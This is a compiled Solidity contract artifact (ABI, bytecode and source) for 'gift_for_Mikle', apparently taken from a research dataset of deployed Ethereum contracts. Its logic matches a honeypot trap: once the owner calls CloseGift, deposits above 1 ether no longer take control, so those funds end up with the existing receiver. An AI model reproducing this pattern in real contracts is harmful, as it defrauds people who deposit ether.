{
  "contractName": "gift_for_Mikle",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_reciver",
          "type": "address"
        }
      ],
      "name": "SetGiftFor",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_unixTime",
          "type": "uint256"
        }
      ],
      "name": "SetGiftTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "CloseGift",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160146101000a81548160ff02191690831515021790555034801561002b57600080fd5b506103ad8061003b6000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633f7e212014610064578063bbcd99f11461007b578063bea948c8146100b1578063dac47a71146100bb575b005b34801561007057600080fd5b506100796100e8565b005b6100af600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061019f565b005b6100b9610296565b005b3480156100c757600080fd5b506100e660048036038101908080359060200190929190505050610314565b005b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561017d57506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614155b1561019d5760018060146101000a81548160ff0219169083151502179055505b565b600160149054906101000a900460ff161580156101c35750670de0b6b3a764000034115b80610205575060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b1561029357336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426002819055505b50565b3373ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161480156102f4575060025442115b15610312573373ffffffffffffffffffffffffffffffffffffffff16ff5b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148015610371575060025442115b1561037e57806002819055505b505600a165627a7a7230582068384f0f6d1ed966c076ef19359f423cfb5c780589fc5f404611555518da843f0029",
  "source": "\n\ncontract gift_for_Mikle\n{\n    address sender;\n    \n    address reciver;\n    \n    bool closed = false;\n    \n    uint unlockTime;\n \n    function SetGiftFor(address _reciver)\n    public\n    payable\n    {\n        if( (!closed&&(msg.value > 1 ether)) || sender==0x00 )\n        {\n            sender = msg.sender;\n            reciver = _reciver;\n            unlockTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint _unixTime)\n    public\n    {\n        if(msg.sender==sender&&now>unlockTime)\n        {\n            unlockTime = _unixTime;\n        }\n    }\n    \n    function GetGift()\n    public\n    payable\n    {\n        if(reciver==msg.sender&&now>unlockTime)\n        {\n            selfdestruct(msg.sender);\n        }\n    }\n    \n    function CloseGift()\n    public\n    {\n        if(sender == msg.sender && reciver != 0x0 )\n        {\n           closed=true;\n        }\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x8cce51969a93ee5235e5955b8e3d649db7f10b81/contracts/0x8cce51969a93ee5235e5955b8e3d649db7f10b81.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:00:24.929Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}